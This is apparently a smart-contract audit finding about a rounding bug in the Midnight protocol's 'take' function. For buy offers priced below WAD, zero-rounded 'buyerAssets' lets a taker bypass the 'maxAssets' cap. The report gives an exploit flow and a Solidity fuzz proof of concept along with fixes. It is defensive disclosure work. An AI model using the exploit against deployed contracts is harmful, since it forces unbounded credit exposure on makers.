### Title
Buy-offer `maxAssets` cap bypassed via zero-rounding of `buyerAssets` when `offerPrice < WAD` - (`src/Midnight.sol`)

### Summary
When a buy offer has `maxAssets > 0` and `offerPrice < WAD` (low tick), `buyerAssets` is computed as `units.mulDivDown(buyerPrice, WAD)`, which rounds to zero for sufficiently small `units`. Because `consumed` is incremented by `buyerAssets` (not `units`), a taker can call `take` repeatedly with small `units` values, each time adding 0 to `consumed`, and fill the offer for an unbounded number of units while the `maxAssets` cap is never triggered. The protocol explicitly acknowledges this in a NatDev comment and a test named `testBugBuyMaxAssetsBypass` confirms the state change occurs.

### Finding Description
**Code path** (`src/Midnight.sol` lines 363–369):

```solidity
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)   // rounds DOWN
    : units.mulDivUp(buyerPrice, WAD);

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

**Root cause:** For a buy offer, `consumed` is incremented by `buyerAssets`, not `units`. When `buyerPrice < WAD` (i.e., `offerPrice < WAD`, achievable at any tick below the WAD boundary) and `units < WAD / buyerPrice`, the expression `units * buyerPrice / WAD` truncates to 0. The guard `require(newConsumed <= offer.maxAssets)` then passes unconditionally because `newConsumed` is unchanged.

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.maxAssets = N > 0`, `offer.tick` set to any tick where `tickToPrice(tick) < WAD`
- `units` chosen so that `units * buyerPrice / WAD == 0` (i.e., `units < WAD / buyerPrice`)

**Exploit flow:**
1. Maker (lender) creates a buy offer with `maxAssets = N` and a tick where `offerPrice < WAD`.
2. Taker calls `take(offer, ..., units=1, ...)` repeatedly (or in a loop).
3. Each call: `buyerAssets = 1 * buyerPrice / WAD = 0` (rounds down). `consumed` stays at its prior value. The `ConsumedAssets` revert never fires.
4. Each call still executes the full position update: `buyerPos.credit += buyerCreditIncrease`, `sellerPos.debt += sellerDebtIncrease`, `totalUnits` increases.
5. After K calls, the maker has K units of credit and the taker has K units of debt, while `consumed` remains at or below `maxAssets`.

**Why existing checks fail:** The only guard is `require(newConsumed <= offer.maxAssets)`. When `buyerAssets == 0`, `newConsumed` is identical to `consumed` before the call, so the check always passes regardless of how many times `take` has been called.

The protocol's own NatDev at line 94 states: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."* The test `testBugBuyMaxAssetsBypass` (lines 858–889 of `test/TakeTest.sol`) pre-sets `consumed == maxAssets`, then calls `take(1, ...)` and asserts `buyerAssets == 0`, `consumed` unchanged, yet `creditOf`, `debtOf`, and `totalUnits` all increase — confirming the bypass is reachable and state-changing.

### Impact Explanation
The maker's `maxAssets` cap — intended to bound total buyer-asset exposure — is completely ineffective when `offerPrice < WAD`. A taker can fill the offer for an arbitrary number of units beyond the maker's intended cap, forcing the maker into a credit position of unlimited size. The maker's risk exposure (bad-debt socialization, maturity settlement) grows without bound, violating the core invariant that *"offers cannot be overfilled."*

### Likelihood Explanation
- **Preconditions:** `offer.buy = true`, `offer.maxAssets > 0`, tick chosen such that `tickToPrice(tick) < WAD`. Ticks below the WAD boundary are valid and reachable by any market participant.
- **Feasibility:** The taker needs no special privilege. The exploit requires only repeated calls to `take` with `units = 1` (or any value below `WAD / buyerPrice`). No oracle manipulation, no admin access, no leaked keys.
- **Repeatability:** Each call is independent and succeeds as long as the offer has not expired. The taker can loop until the maker's credit reaches any desired level.

### Recommendation
For buy offers in assets mode, either:
1. **Require `buyerAssets > 0` when `units > 0`:** Add `require(units == 0 || buyerAssets > 0)` before the `consumed` update, preventing zero-asset fills from mutating position state.
2. **Track `units` in `consumed` even in assets mode:** When `offer.maxAssets > 0 && offer.buy`, increment `consumed` by `units` and enforce a derived units cap (`maxAssets * WAD / buyerPrice`), eliminating the rounding gap entirely.
3. **Use `mulDivUp` for the `consumed` increment:** Change `buyerAssets` used for `consumed` tracking (not for transfer) to `units.mulDivUp(buyerPrice, WAD)`, so every non-zero `units` fill increments `consumed` by at least 1, bounding total fills.

### Proof of Concept
The existing test `testBugBuyMaxAssetsBypass` in `test/TakeTest.sol` already constitutes a passing PoC. An extended fuzz/invariant version:

```solidity
function testFuzz_BuyMaxAssetsBypassUnboundedUnits(uint256 numFills) public {
    numFills = bound(numFills, 2, 1000);

    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1;          // cap = 1 asset-unit
    lenderOffer.tick = MAX_TICK - 16;   // offerPrice < WAD → buyerPrice < WAD

    collateralize(market, borrower, numFills + 1);

    uint256 totalUnits;
    for (uint256 i; i < numFills; i++) {
        (uint256 ba,) = take(1, borrower, lenderOffer);
        assertEq(ba, 0, "buyerAssets must be 0 for bypass to hold");
        totalUnits += 1;
    }

    // consumed never exceeded maxAssets, yet totalUnits >> 0
    assertLe(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
    assertEq(midnight.debtOf(id, borrower), totalUnits);
    // INVARIANT VIOLATED: offer filled for totalUnits >> intended cap
    assertGt(totalUnits, lenderOffer.maxAssets);
}
```

**Expected assertions:** All pass, demonstrating that `consumed` stays ≤ 1 while `debtOf(borrower)` equals `numFills`, proving the cap is bypassed.

---

**Key citations:**

`buyerAssets` rounded down for buy offers: [1](#0-0) 

`consumed` incremented by `buyerAssets` (not `units`) for buy offers: [2](#0-1) 

Protocol's own acknowledgment of the behavior: [3](#0-2) 

Existing test confirming the bypass (named "Bug"): [4](#0-3)

### Citations

**File:** src/Midnight.sol (L93-94)
```text
/// @dev Midnight can call the callback of offers through a no-op take, even if those offers have consumed==max.
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L363-363)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
```

**File:** src/Midnight.sol (L367-369)
```text
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** test/TakeTest.sol (L858-889)
```text
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
